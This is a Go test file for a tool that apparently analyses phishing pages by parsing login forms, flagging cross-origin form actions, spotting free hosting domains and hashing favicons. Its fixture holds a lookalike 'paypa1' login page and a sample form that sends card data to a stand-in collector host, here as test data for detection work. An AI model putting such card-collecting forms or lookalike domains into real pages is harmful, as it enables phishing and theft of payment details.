package report

import (
	"net/url"
	"os"
	"path/filepath"
	"testing"
)

func TestForms(t *testing.T) {
	dir := t.TempDir()
	dom := filepath.Join(dir, "dom.html")
	os.WriteFile(dom, []byte(`<html><head><base href="/kit/"></head><body>
<form id=search><input name=q></form>
<form method=POST action="post.php"><input type=email name=email><input type=PASSWORD name=pass>
  <form action="https://ignored.test/"></form><select name=c></select><input type=hidden name=t value=x></form>
<form action="https://collector.evil.test/x" method=post><input name=card><textarea name=note></textarea></form>
<form action="javascript:void(0)"><input type=password></form>
<div id=spa-login><input type=password name=p2></div>
</body></html>`), 0o600)
	final, _ := url.Parse("https://login.paypa1.test/signin")
	fs, pw := forms(dom, final)
	if pw != 3 {
		t.Errorf("password fields = %d, want 3", pw)
	}
	if len(fs) != 4 {
		t.Fatalf("forms = %d, want 4: %v", len(fs), fs)
	}
	if fs[0].GetAction() != "https://login.paypa1.test/kit/" || fs[0].GetMethod() != "get" || fs[0].GetHasPassword() {
		t.Errorf("search form = %v", fs[0])
	}
	f := fs[1]
	if f.GetAction() != "https://login.paypa1.test/kit/post.php" || f.GetMethod() != "post" || !f.GetHasPassword() || f.GetCrossOriginAction() {
		t.Errorf("login form = %v", f)
	}
	var types []string
	for _, x := range f.GetFields() {
		types = append(types, x.GetName()+":"+x.GetType())
	}
	// The nested <form> start is ignored and its </form> closes the outer form, as in browsers:
	// c and t end up outside it.
	if got := fmtList(types); got != "email:email pass:password" {
		t.Errorf("login form fields = %s", got)
	}
	if !fs[2].GetCrossOriginAction() || fs[2].GetAction() != "https://collector.evil.test/x" {
		t.Errorf("exfil form = %v", fs[2])
	}
	if fs[3].GetCrossOriginAction() {
		t.Errorf("a javascript: action isn't cross-origin: %v", fs[3])
	}
}

func TestFormsCapped(t *testing.T) {
	dir := t.TempDir()
	dom := filepath.Join(dir, "dom.html")
	b := []byte("<form>")
	for range 200 {
		b = append(b, "<input name=x>"...)
	}
	b = append(b, "</form>"...)
	for range 100 {
		b = append(b, "<form></form>"...)
	}
	os.WriteFile(dom, b, 0o600)
	fs, _ := forms(dom, nil)
	if len(fs) != maxForms || len(fs[0].GetFields()) != maxFields {
		t.Errorf("forms %d, fields %d", len(fs), len(fs[0].GetFields()))
	}
}

func fmtList(s []string) string {
	out := ""
	for i, x := range s {
		if i > 0 {
			out += " "
		}
		out += x
	}
	return out
}

func TestFreeHost(t *testing.T) {
	for host, want := range map[string]string{
		"crediplus--credi0.replit.app": "replit.app", "X.GitHub.io.": "github.io", "bagidimofu.duckdns.org": "duckdns.org",
		"replit.app.example.com": "", "notgithub.io": "", "www.facebook.com": "",
	} {
		if got := freeHost(host); got != want {
			t.Errorf("freeHost(%q) = %q, want %q", host, got, want)
		}
	}
}

func TestFavicons(t *testing.T) {
	dir := t.TempDir()
	g := filepath.Join(dir, "guest")
	os.MkdirAll(g, 0o700)
	os.WriteFile(filepath.Join(g, "favicon-0"), []byte("icon bytes"), 0o600)
	os.WriteFile(filepath.Join(g, "dom.html"), []byte("<p>not an icon</p>"), 0o600)
	os.WriteFile(filepath.Join(g, "favicons.json"), []byte(`[{"url":"https://a.test/favicon.ico","mime":"image/x-icon","file":"favicon-0"},
		{"url":"https://a.test/x","mime":"image/png","file":"dom.html"},{"url":"https://a.test/y","file":"favicon-3"}]`), 0o600)
	fs := favicons(dir)
	if len(fs) != 1 || fs[0].GetFile() != "favicon-0" || fs[0].GetSize() != 10 ||
		fs[0].GetSha256() != "683d6b4622c462c412fe42706f81aa73b9a2c4e9ddd9f34630f7dcff08a2c769" {
		t.Errorf("favicons = %v", fs)
	}
}
